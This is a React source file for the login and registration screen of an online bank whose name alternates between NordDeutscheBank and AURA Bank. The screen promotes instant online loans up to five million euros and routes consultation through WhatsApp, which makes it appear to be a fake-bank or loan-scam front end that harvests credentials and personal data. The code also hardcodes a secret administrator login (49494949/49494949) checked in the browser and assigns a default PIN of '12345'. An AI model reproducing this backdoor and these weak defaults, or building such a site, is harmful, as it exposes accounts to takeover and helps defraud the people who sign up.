import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  Landmark, 
  CreditCard, 
  ChevronRight, 
  ChevronLeft, 
  Lock, 
  UserCheck, 
  Eye, 
  EyeOff, 
  Award,
  Zap,
  Sparkles,
  Building2,
  CheckCircle2,
  ArrowLeft
} from 'lucide-react';
import { UserStore, ManagedUser } from '../../data/userStore';
import { NordBankLogo } from '../common/NordBankLogo';
import { CorporateVideoPresentation } from '../common/CorporateVideoPresentation';
import { signInWithGooglePopup, saveUserToFirestore, getUserFromFirestore } from '../../firebase';

interface AuthViewProps {
  onLogin: (userName: string, email: string, isNewUser?: boolean, accountType?: string, managedUser?: ManagedUser) => void;
  onAdminLogin: () => void;
  darkMode: boolean;
  onToggleDarkMode: () => void;
  onShowToast: (title: string, message?: string, type?: 'success' | 'error' | 'info') => void;
}

export const AuthView: React.FC<AuthViewProps> = ({
  onLogin,
  onAdminLogin,
  darkMode,
  onToggleDarkMode,
  onShowToast,
}) => {
  // Form Mode State: 'login' | 'register'
  const [authMode, setAuthMode] = useState<'login' | 'register'>('login');

  // Login form state - completely clean with zero demo prefill
  const [loginEmail, setLoginEmail] = useState('');
  const [loginPin, setLoginPin] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [isAuthenticating, setIsAuthenticating] = useState(false);

  // Register form state
  const [regFirstName, setRegFirstName] = useState('');
  const [regLastName, setRegLastName] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regPhone, setRegPhone] = useState('');
  const [regPin, setRegPin] = useState('');
  const [showRegPin, setShowRegPin] = useState(false);
  const [regAcceptedTerms, setRegAcceptedTerms] = useState(true);

  // Arrêt spontané et définitif de toutes les vidéos et sons dès connexion / inscription
  const stopAllMedia = () => {
    if (typeof document !== 'undefined') {
      document.querySelectorAll('video, audio').forEach((media) => {
        try {
          const m = media as HTMLMediaElement;
          m.pause();
          m.muted = true;
          m.currentTime = 0;
        } catch (e) {}
      });
    }
  };

  const handleGoogleSignIn = async () => {
    setIsAuthenticating(true);
    stopAllMedia();
    try {
      const googleUser = await signInWithGooglePopup();
      if (googleUser) {
        const uid = googleUser.uid;
        const displayName = googleUser.displayName || 'Google Kunde';
        const email = googleUser.email || 'kunde@gmail.com';
        const photoURL = googleUser.photoURL || undefined;

        // Firestore persistent record
        const firestoreRecord = {
          id: uid,
          name: displayName,
          email: email,
          phone: googleUser.phoneNumber || '',
          photoURL: photoURL,
          authProvider: 'google.com',
          accountType: 'NordDeutscheBank Girokonto (Cloud Verifiziert)',
          updatedAt: new Date().toISOString()
        };
        await saveUserToFirestore(uid, firestoreRecord);

        // Synchronize in local UserStore for UI reactivity
        let managedUser = UserStore.getUserById(uid);
        if (!managedUser) {
          managedUser = await UserStore.registerNewUserAsync(
            displayName,
            email,
            googleUser.phoneNumber || '',
            '12345',
            0
          );
          managedUser.id = uid;
          UserStore.updateUser(managedUser);
        }

        setIsAuthenticating(false);
        onShowToast('Google-Anmeldung erfolgreich!', `Willkommen, ${displayName}!`, 'success');
        onLogin(displayName, email, false, managedUser.account.accountType, managedUser);
      }
    } catch (error: any) {
      setIsAuthenticating(false);
      console.warn('Google Sign-in status:', error);
      if (error?.code !== 'auth/popup-closed-by-user') {
        onShowToast('Google-Anmeldung', 'Authentifizierung konnte nicht abgeschlossen werden.', 'error');
      }
    }
  };

  const handleFormLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanUser = loginEmail.trim();
    const cleanPin = loginPin.trim();

    if (!cleanUser || !cleanPin) {
      onShowToast('Pflichtfelder erforderlich', 'Bitte geben Sie Ihre Kennung und Ihr Passwort ein.', 'error');
      return;
    }

    // Arrêt spontané immédiat de la vidéo dès la tentative de connexion
    stopAllMedia();

    // Geheimer Administrationszugang: 49494949 / 49494949
    if (cleanUser === '49494949' && cleanPin === '49494949') {
      setIsAuthenticating(true);
      setTimeout(() => {
        setIsAuthenticating(false);
        stopAllMedia();
        onShowToast('Administrator-Zugang bestätigt', 'Willkommen im Administrations-Dashboard.', 'success');
        onAdminLogin();
      }, 500);
      return;
    }

    // Regulärer Kunden-Login über die zentrale Server-Datenbank (funktioniert auf jedem Handy/Browser)
    setIsAuthenticating(true);
    try {
      const user = await UserStore.authenticateUser(cleanUser, cleanPin);
      setIsAuthenticating(false);
      if (user) {
        stopAllMedia();
        onShowToast('Anmeldung erfolgreich', `Willkommen in Ihrem Bereich, ${user.name}.`, 'success');
        onLogin(user.name, user.email, false, user.account.accountType, user);
      } else {
        onShowToast('Ungültige Anmeldedaten', 'Benutzerkennung oder Passwort nicht korrekt. Bitte prüfen Sie Ihre Eingabe.', 'error');
      }
    } catch (err) {
      setIsAuthenticating(false);
      onShowToast('Verbindungsfehler', 'Die Server-Datenbank konnte nicht erreicht werden. Bitte versuchen Sie es erneut.', 'error');
    }
  };

  const handleFormRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!regFirstName || !regLastName || !regEmail) {
      onShowToast('Pflichtfelder ausfüllen', 'Bitte tragen Sie Vorname, Nachname und E-Mail-Adresse ein.', 'error');
      return;
    }

    // Arrêt spontané immédiat de la vidéo dès l'inscription
    stopAllMedia();

    const fullName = `${regFirstName} ${regLastName}`.trim();
    const pin = regPin.trim() || '12345';

    setIsAuthenticating(true);
    try {
      const newUser = await UserStore.registerNewUserAsync(fullName, regEmail, regPhone, pin, 0);
      setIsAuthenticating(false);
      stopAllMedia();
      onShowToast('Konto erfolgreich eröffnet!', `Herzlich willkommen bei der NordDeutscheBank, ${fullName}!`, 'success');
      onLogin(fullName, regEmail, true, 'NordDeutscheBank Girokonto', newUser);
    } catch (err) {
      setIsAuthenticating(false);
      onShowToast('Erstellungsfehler', 'Konto konnte nicht auf dem Server angelegt werden.', 'error');
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 dark:bg-slate-950 text-slate-900 dark:text-slate-100 flex flex-col justify-between selection:bg-emerald-500 selection:text-white pb-12">
      {/* Top Navbar */}
      <header className="sticky top-0 z-30 bg-white/80 dark:bg-slate-900/80 backdrop-blur-md border-b border-slate-200/80 dark:border-slate-800/80">
        <div className="max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
          <NordBankLogo size={36} showText={true} />

          <div className="flex items-center gap-2">
            <button
              onClick={onToggleDarkMode}
              className="w-9 h-9 rounded-xl flex items-center justify-center text-slate-600 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors cursor-pointer"
              title="Design wechseln"
            >
              <span className="text-xs font-bold">{darkMode ? '☀️' : '🌙'}</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-4xl mx-auto px-4 w-full pt-6 space-y-6 flex-1">
        {/* 1. OFFZIELLER UNTERNEHMENSFILM & BERATERTEAM DER NORDDEUTSCHEBANK */}
        <CorporateVideoPresentation
          forceStop={isAuthenticating}
          onOpenWhatsApp={() => window.open('https://wa.me/qr/LGKAAD5GCWA4O1', '_blank', 'noopener,noreferrer')}
          onOpenConsultation={() => {
            const formElement = document.getElementById('auth-form-card');
            if (formElement) {
              formElement.scrollIntoView({ behavior: 'smooth' });
            }
          }}
        />

        {/* 2. EXKLUSIVES KREDIT- & FINANZIERUNGSANGEBOT (Hervorgehobener Informationsbanner) */}
        <section className="bg-gradient-to-r from-emerald-900/90 via-slate-900 to-indigo-950 text-white rounded-3xl p-5 sm:p-6 border border-emerald-500/30 shadow-lg relative overflow-hidden">
          <div className="absolute right-0 top-0 translate-x-8 -translate-y-8 w-44 h-44 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none" />
          <div className="relative z-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
            <div className="space-y-1.5 max-w-xl">
              <div className="flex items-center gap-2">
                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                  <Sparkles className="w-3 h-3 text-emerald-300" />
                  Kreditangebote &amp; Online-Darlehen
                </span>
                <span className="text-[11px] font-semibold text-slate-300">
                  Privat &amp; Gewerbe
                </span>
              </div>
              <h3 className="text-base sm:text-lg font-black text-white">
                Darlehen von 5.000 € bis 100.000 € &amp; Online-Finanzierungen bis 5.000.000 €
              </h3>
              <p className="text-xs text-slate-300 leading-relaxed">
                Wir vergeben Ratenkredite von <strong>5.000 € bis 100.000 €</strong> für Privatkunden sowie flexible Online-Kredite und Firmenfinanzierungen von bis zu <strong>5.000.000 € (5 Millionen Euro)</strong> für Unternehmen und Selbstständige. Konditionen und Darlehenshöhe richten sich nach Ihren individuellen Bedürfnissen und der Bonitätsprüfung von Person und Unternehmen.
              </p>
            </div>

            <div className="shrink-0 flex sm:flex-col items-center gap-2">
              <div className="px-3.5 py-2 rounded-2xl bg-white/10 backdrop-blur-md border border-white/10 text-center">
                <span className="block text-[10px] text-emerald-300 uppercase font-semibold">Online-Sofortprüfung</span>
                <span className="text-xs font-mono font-bold text-white">100% Digital</span>
              </div>
            </div>
          </div>
        </section>

        {/* 3. ESPACE ANMELDUNG & KONTOERÖFFNUNG */}
        <section id="auth-form-card" aria-label="Anmeldung oder Registrierung" className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200/80 dark:border-slate-800 shadow-lg">
          {/* Tabs: Anmelden / Konto eröffnen */}
          <div className="flex items-center bg-slate-100 dark:bg-slate-800 p-1.5 rounded-2xl mb-6">
            <button
              type="button"
              onClick={() => setAuthMode('login')}
              className={`flex-1 py-2.5 text-xs font-bold rounded-xl transition-all cursor-pointer ${
                authMode === 'login'
                  ? 'bg-white dark:bg-slate-700 text-slate-900 dark:text-white shadow-sm'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
              }`}
            >
              Anmelden
            </button>
            <button
              type="button"
              onClick={() => setAuthMode('register')}
              className={`flex-1 py-2.5 text-xs font-bold rounded-xl transition-all cursor-pointer ${
                authMode === 'register'
                  ? 'bg-white dark:bg-slate-700 text-slate-900 dark:text-white shadow-sm'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
              }`}
            >
              Konto eröffnen
            </button>
          </div>

          {/* Formular A: Anmelden */}
          {authMode === 'login' && (
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-bold text-slate-900 dark:text-white">
                  Zugang zu Ihrem gesicherten Online-Banking
                </h3>
                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                  Geben Sie Ihre Zugangsdaten ein, um sich sicher in Ihr Banking-Konto einzuloggen.
                </p>
              </div>

              {/* Google Sign-in with Firebase Auth */}
              <div className="space-y-3">
                <button
                  type="button"
                  onClick={handleGoogleSignIn}
                  disabled={isAuthenticating}
                  className="w-full flex items-center justify-center gap-3 py-3 px-4 rounded-xl border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-800 hover:bg-slate-50 dark:hover:bg-slate-750 text-slate-800 dark:text-white font-bold text-xs shadow-sm transition-all cursor-pointer hover:shadow"
                >
                  <svg className="w-4 h-4 shrink-0" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
                  </svg>
                  <span>Mit Google fortfahren (Firebase Auth)</span>
                </button>
                <div className="flex items-center gap-3">
                  <div className="h-px bg-slate-200 dark:bg-slate-700 flex-1" />
                  <span className="text-[11px] uppercase tracking-wider text-slate-400 font-semibold">oder mit Kennung &amp; PIN</span>
                  <div className="h-px bg-slate-200 dark:bg-slate-700 flex-1" />
                </div>
              </div>

              <form onSubmit={handleFormLogin} className="space-y-4">
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between">
                    <label className="text-xs font-bold text-slate-800 dark:text-slate-200 flex items-center gap-1.5">
                      <span>Mobilfunknummer oder Gmail / E-Mail</span>
                    </label>
                    <span className="text-[10px] text-emerald-600 dark:text-emerald-400 font-semibold bg-emerald-50 dark:bg-emerald-950/60 px-2 py-0.5 rounded-full border border-emerald-500/20">
                      2 Login-Optionen
                    </span>
                  </div>
                  <input
                    type="text"
                    required
                    value={loginEmail}
                    onChange={(e) => setLoginEmail(e.target.value)}
                    placeholder="z.B. +49 170 1234567 oder ihr-name@gmail.com"
                    className="w-full px-4 py-3 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white text-xs font-medium focus:ring-2 focus:ring-emerald-500 outline-none"
                  />
                  <p className="text-[10px] text-slate-500 dark:text-slate-400 leading-relaxed">
                    💡 Sie können sich wahlweise mit Ihrer <strong className="text-slate-700 dark:text-slate-200 font-semibold">Telefonnummer</strong> (aus Ihrer Registrierung) oder mit Ihrer <strong className="text-slate-700 dark:text-slate-200 font-semibold">Gmail / E-Mail</strong> und Ihrem persönlichen Passwort anmelden.
                  </p>
                </div>

                <div className="space-y-1">
                  <div className="flex items-center justify-between">
                    <label className="text-xs font-semibold text-slate-700 dark:text-slate-300">
                      Passwort / Online-PIN
                    </label>
                  </div>
                  <div className="relative">
                    <input
                      type={showPin ? 'text' : 'password'}
                      required
                      value={loginPin}
                      onChange={(e) => setLoginPin(e.target.value)}
                      placeholder="••••••••"
                      className="w-full px-4 py-2.5 pr-10 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white text-xs font-mono font-medium focus:ring-2 focus:ring-emerald-500 outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPin(!showPin)}
                      className="absolute right-3 top-2.5 text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 cursor-pointer"
                    >
                      {showPin ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                <div className="flex items-center justify-between pt-1">
                  <label className="flex items-center gap-2 text-xs text-slate-600 dark:text-slate-400 cursor-pointer">
                    <input type="checkbox" defaultChecked className="rounded text-emerald-600 focus:ring-emerald-500" />
                    <span>Angemeldet bleiben</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => onShowToast('Passwort zurücksetzen', 'Bitte kontaktieren Sie den Kundenservice zur Identitätsbestätigung.', 'info')}
                    className="text-xs font-medium text-emerald-600 dark:text-emerald-400 hover:underline cursor-pointer"
                  >
                    Passwort vergessen?
                  </button>
                </div>

                <div className="pt-2">
                  <button
                    type="submit"
                    disabled={isAuthenticating}
                    className="w-full flex items-center justify-center gap-2 py-3 rounded-xl bg-slate-900 dark:bg-white text-white dark:text-slate-950 hover:bg-slate-800 dark:hover:bg-slate-100 font-bold text-xs shadow-md transition-colors cursor-pointer"
                  >
                    <Lock className="w-4 h-4" />
                    <span>{isAuthenticating ? 'Sicherheitsprüfung läuft...' : 'Sicher anmelden'}</span>
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* Formular B: Konto eröffnen */}
          {authMode === 'register' && (
            <div className="space-y-6">
              <div className="flex items-center gap-3">
                <button
                  type="button"
                  onClick={() => setAuthMode('login')}
                  className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-100 text-xs font-bold transition-all cursor-pointer shadow-sm border border-slate-200/80 dark:border-slate-700 shrink-0"
                  title="Zurück zur Anmeldung"
                >
                  <ArrowLeft className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                  <span>Zurück</span>
                </button>
                <div>
                  <h3 className="text-lg font-bold text-slate-900 dark:text-white">
                    AURA Bankkonto online eröffnen
                  </h3>
                  <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                    100% digital, blitzschnelle Kontoeröffnung mit deutscher IBAN und Debitkarte inklusive.
                  </p>
                </div>
              </div>

              {/* Instant Google Register */}
              <div className="space-y-3">
                <button
                  type="button"
                  onClick={handleGoogleSignIn}
                  disabled={isAuthenticating}
                  className="w-full flex items-center justify-center gap-3 py-3 px-4 rounded-xl border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-800 hover:bg-slate-50 dark:hover:bg-slate-750 text-slate-800 dark:text-white font-bold text-xs shadow-sm transition-all cursor-pointer hover:shadow"
                >
                  <svg className="w-4 h-4 shrink-0" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
                  </svg>
                  <span>Direkt mit Google registrieren (Firebase Auth)</span>
                </button>
                <div className="flex items-center gap-3">
                  <div className="h-px bg-slate-200 dark:bg-slate-700 flex-1" />
                  <span className="text-[11px] uppercase tracking-wider text-slate-400 font-semibold">oder Daten manuell eingeben</span>
                  <div className="h-px bg-slate-200 dark:bg-slate-700 flex-1" />
                </div>
              </div>

              <form onSubmit={handleFormRegister} className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-700 dark:text-slate-300">
                      Vorname *
                    </label>
                    <input
                      type="text"
                      required
                      placeholder="z. B. Maximilian"
                      value={regFirstName}
                      onChange={(e) => setRegFirstName(e.target.value)}
                      className="w-full px-4 py-2.5 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white text-xs font-medium focus:ring-2 focus:ring-emerald-500 outline-none"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-700 dark:text-slate-300">
                      Nachname *
                    </label>
                    <input
                      type="text"
                      required
                      placeholder="z. B. Weber"
                      value={regLastName}
                      onChange={(e) => setRegLastName(e.target.value)}
                      className="w-full px-4 py-2.5 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white text-xs font-medium focus:ring-2 focus:ring-emerald-500 outline-none"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-700 dark:text-slate-300">
                      E-Mail-Adresse *
                    </label>
                    <input
                      type="email"
                      required
                      placeholder="name@beispiel.de"
                      value={regEmail}
                      onChange={(e) => setRegEmail(e.target.value)}
                      className="w-full px-4 py-2.5 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white text-xs font-medium focus:ring-2 focus:ring-emerald-500 outline-none"
                    />
                  </div>

                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <label className="text-xs font-semibold text-slate-700 dark:text-slate-300">
                        Mobilfunknummer *
                      </label>
                      <span className="text-[10px] text-emerald-600 dark:text-emerald-400 font-medium">
                        Login-Kennung
                      </span>
                    </div>
                    <input
                      type="tel"
                      required
                      placeholder="+49 170 1234567"
                      value={regPhone}
                      onChange={(e) => setRegPhone(e.target.value)}
                      className="w-full px-4 py-2.5 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white text-xs font-medium focus:ring-2 focus:ring-emerald-500 outline-none"
                    />
                  </div>
                </div>

                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-700 dark:text-slate-300">
                    Sicheres Passwort / PIN festlegen *
                  </label>
                  <div className="relative">
                    <input
                      type={showRegPin ? 'text' : 'password'}
                      required
                      placeholder="Passwort mit mind. 6 Zeichen"
                      value={regPin}
                      onChange={(e) => setRegPin(e.target.value)}
                      className="w-full px-4 py-2.5 pr-10 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white text-xs font-mono font-medium focus:ring-2 focus:ring-emerald-500 outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => setShowRegPin(!showRegPin)}
                      className="absolute right-3 top-2.5 text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 cursor-pointer"
                    >
                      {showRegPin ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                <label className="flex items-start gap-2.5 pt-2 text-xs text-slate-600 dark:text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={regAcceptedTerms}
                    onChange={(e) => setRegAcceptedTerms(e.target.checked)}
                    className="mt-0.5 rounded text-emerald-600 focus:ring-emerald-500"
                  />
                  <span>
                    Ich stimme den Allgemeinen Geschäftsbedingungen (AGB) und den Datenschutzbestimmungen der AURA Bank zu.
                  </span>
                </label>

                <button
                  type="submit"
                  disabled={isAuthenticating}
                  className="w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 active:bg-emerald-700 text-white font-extrabold text-xs shadow-lg transition-transform active:scale-95 cursor-pointer"
                >
                  <UserCheck className="w-4 h-4" />
                  <span>{isAuthenticating ? 'Konto wird eingerichtet...' : 'Jetzt Girokonto kostenlos eröffnen'}</span>
                </button>
              </form>
            </div>
          )}
        </section>

        {/* 4. DETAILS ZU KREDITEN & FINANZIERUNGSMÖGLICHKEITEN */}
        <section className="bg-slate-100 dark:bg-slate-900/60 rounded-3xl p-6 border border-slate-200/80 dark:border-slate-800/80 space-y-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-indigo-50 dark:bg-indigo-950/60 text-indigo-600 dark:text-indigo-400 flex items-center justify-center shrink-0">
              <Landmark className="w-5 h-5" />
            </div>
            <div>
              <h4 className="text-sm font-bold text-slate-900 dark:text-white">
                Finanzierungslösungen nach Maß
              </h4>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Von kleinen Projekten bis zu Großinvestitionen für Privat und Gewerbe
              </p>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
            <div className="p-4 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200/70 dark:border-slate-800 space-y-2">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-emerald-500" />
                <h5 className="text-xs font-bold text-slate-900 dark:text-white">
                  Privatkredite (5.000 € bis 100.000 €)
                </h5>
              </div>
              <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed">
                Schnelle Online-Abwicklung mit flexiblen Laufzeiten von 12 bis 84 Monaten. Feste monatliche Raten, transparente Zinssätze und kostenlose Sondertilgungen jederzeit möglich.
              </p>
            </div>

            <div className="p-4 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200/70 dark:border-slate-800 space-y-2">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-indigo-500" />
                <h5 className="text-xs font-bold text-slate-900 dark:text-white">
                  Online-Finanzierung bis 5.000.000 €
                </h5>
              </div>
              <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed">
                Umfassende Finanzierungsmöglichkeiten für Unternehmen, Selbstständige und gehobene Vorhaben bis zu 5 Millionen Euro – individuell abgestimmt auf die finanzielle Leistungsfähigkeit und das Unternehmensprofil.
              </p>
            </div>
          </div>
        </section>

        {/* 5. VORTEILE DER AURA BANK */}
        <section aria-label="Vorteile und Garantien" className="space-y-6">
          <div className="text-center space-y-1">
            <h3 className="text-lg font-bold text-slate-900 dark:text-white">
              Warum AURA Banking &amp; Finance wählen?
            </h3>
            <p className="text-xs text-slate-500 dark:text-slate-400 max-w-md mx-auto">
              Modernste Banking-Technologie kombiniert mit höchsten regulatorischen Sicherheitsstandards.
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <div className="p-5 rounded-3xl bg-white dark:bg-slate-900 border border-slate-200/80 dark:border-slate-800 shadow-sm space-y-2">
              <div className="w-10 h-10 rounded-2xl bg-emerald-50 dark:bg-emerald-950/60 text-emerald-600 dark:text-emerald-400 flex items-center justify-center">
                <Zap className="w-5 h-5" />
              </div>
              <h4 className="text-sm font-bold text-slate-900 dark:text-white">
                SEPA-Echtzeitüberweisungen
              </h4>
              <p className="text-xs text-slate-500 dark:text-slate-400 leading-relaxed">
                Geld in wenigen Sekunden rund um die Uhr (24/7) senden und empfangen – vollkommen kostenfrei.
              </p>
            </div>

            <div className="p-5 rounded-3xl bg-white dark:bg-slate-900 border border-slate-200/80 dark:border-slate-800 shadow-sm space-y-2">
              <div className="w-10 h-10 rounded-2xl bg-indigo-50 dark:bg-indigo-950/60 text-indigo-600 dark:text-indigo-400 flex items-center justify-center">
                <Landmark className="w-5 h-5" />
              </div>
              <h4 className="text-sm font-bold text-slate-900 dark:text-white">
                100% Digitale Kredite
              </h4>
              <p className="text-xs text-slate-500 dark:text-slate-400 leading-relaxed">
                Online-Kredite von 5.000 € bis 100.000 € und bis zu 5.000.000 € für Firmen mit Sofortprüfung und flexiblen Tilgungsoptionen.
              </p>
            </div>

            <div className="p-5 rounded-3xl bg-white dark:bg-slate-900 border border-slate-200/80 dark:border-slate-800 shadow-sm space-y-2">
              <div className="w-10 h-10 rounded-2xl bg-sky-50 dark:bg-sky-950/60 text-sky-600 dark:text-sky-400 flex items-center justify-center">
                <Award className="w-5 h-5" />
              </div>
              <h4 className="text-sm font-bold text-slate-900 dark:text-white">
                Einlagensicherung 100.000 €
              </h4>
              <p className="text-xs text-slate-500 dark:text-slate-400 leading-relaxed">
                Gesetzlicher Einlagenschutz bis zu 100.000 € je Kunde nach strengen europäischen Richtlinien.
              </p>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="max-w-4xl mx-auto px-4 w-full pt-8 text-center text-xs text-slate-400 space-y-2">
        <div className="flex flex-wrap items-center justify-center gap-4 text-[11px]">
          <span>© 2026 AURA Banking Group</span>
          <span aria-hidden="true">·</span>
          <span>256-Bit SSL-Verschlüsselung</span>
          <span aria-hidden="true">·</span>
          <span>Sicherheit &amp; Datenschutz</span>
        </div>
      </footer>
    </div>
  );
};
